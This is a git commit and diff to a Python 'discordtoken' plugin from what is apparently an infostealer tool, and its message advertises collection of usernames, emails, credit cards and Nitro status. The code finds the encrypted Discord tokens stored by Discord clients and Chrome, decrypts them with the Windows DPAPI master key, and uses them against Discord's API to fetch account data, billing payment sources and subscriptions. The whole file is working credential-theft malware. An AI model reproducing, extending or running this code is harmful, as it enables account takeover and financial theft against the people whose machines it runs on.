a7d0cc30b228b7e5d3e6847c193d5e061c143d2f
Faccin27 <gfaccin27@gmail.com>
2024-09-16 00:51:24 -0300

    feat: update Discord plugin to include additional information such as username, email, credit cards, Nitro status, etc.

--- plugins/discordtoken.py
+++ plugins/discordtoken.py
@@ -4,8 +4,8 @@ import os
 import re
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-import requests  
-
+import requests
+from datetime import datetime
 
 class TokenExtractor:
     def __init__(self):
@@ -14,6 +14,7 @@ class TokenExtractor:
         self.roaming = os.getenv("appdata")
         self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
         self.tokens = []
+        self.validated_tokens = []  
 
     def extract_tokens(self):
         paths = {
@@ -24,13 +25,12 @@ class TokenExtractor:
             'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
         }
 
-
         for name, path in paths.items():
             if not os.path.exists(path):
                 continue
             _discord = name.replace(" ", "").lower()
             if "cord" in path:
-                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
+                if not os.path.exists(self.roaming + f'\\{_discord}\\Local State'):
                     continue
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
@@ -38,21 +38,70 @@ class TokenExtractor:
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for y in re.findall(self.regexp_enc, line):
                             token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
-                                                    self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
-                            if self.validate_token(token):
+                                                     self.get_master_key(self.roaming + f'\\{_discord}\\Local State'))
+                            if token not in self.validated_tokens and self.validate_token(token):
                                 self.tokens.append(token)
+                                self.validated_tokens.append(token) 
             else:
                 for file_name in os.listdir(path):
                     if file_name[-3:] not in ["log", "ldb"]:
                         continue
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                         for token in re.findall(self.regexp_enc, line):
-                            if self.validate_token(token):
+                            if token not in self.validated_tokens and self.validate_token(token):
                                 self.tokens.append(token)
-        
+                                self.validated_tokens.append(token)  
+
     def validate_token(self, token):
+        user_data = self.get_user_data(token)
+        if user_data and token not in self.validated_tokens:  
+            print(f"Token: {token}")
+            print(f"Nome de usuário: {user_data['username']}")
+            print(f"E-mail: {user_data.get('email', 'Não disponível')}")
+
+            payment_sources = self.get_payment_sources(token)
+            if payment_sources:
+                print(f"Cartões de crédito registrados: {len(payment_sources)}")
+            else:
+                print("Nenhum cartão de crédito registrado")
+
+            if user_data['premium_type']:
+                subscriptions = self.get_nitro_subscription(token)
+                if subscriptions:
+                    for sub in subscriptions:
+                        renew_timestamp = sub.get("current_period_end")
+                        if renew_timestamp:
+                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
+                            print(f"Nitro ativo, expira em: {expiration_date}")
+                        else:
+                            print("Nitro ativo, mas sem data de expiração disponível")
+                else:
+                    print("Nitro ativo, mas sem informações sobre a assinatura")
+            else:
+                print("Nitro: Não")
+            print("-" * 30)
+            return True
+        return False
+
+    def get_user_data(self, token):
         response = requests.get(self.base_url, headers={'Authorization': token})
-        return response.status_code == 200
+        if response.status_code == 200:
+            return response.json()
+        return None
+
+    def get_payment_sources(self, token):
+        payment_url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
+        response = requests.get(payment_url, headers={'Authorization': token})
+        if response.status_code == 200:
+            return response.json()
+        return None
+
+    def get_nitro_subscription(self, token):
+        subscription_url = "https://discord.com/api/v9/users/@me/billing/subscriptions"
+        response = requests.get(subscription_url, headers={'Authorization': token})
+        if response.status_code == 200:
+            return response.json()
+        return None
 
     def decrypt_val(self, buff, master_key):
         iv = buff[3:15]
@@ -74,8 +123,7 @@ class TokenExtractor:
 
     def get_tokens(self):
         self.extract_tokens()
-        unique_tokens = list(set(self.tokens))
-        return unique_tokens
+        return list(set(self.tokens))  
 
 if __name__ == "__main__":
     extractor = TokenExtractor()
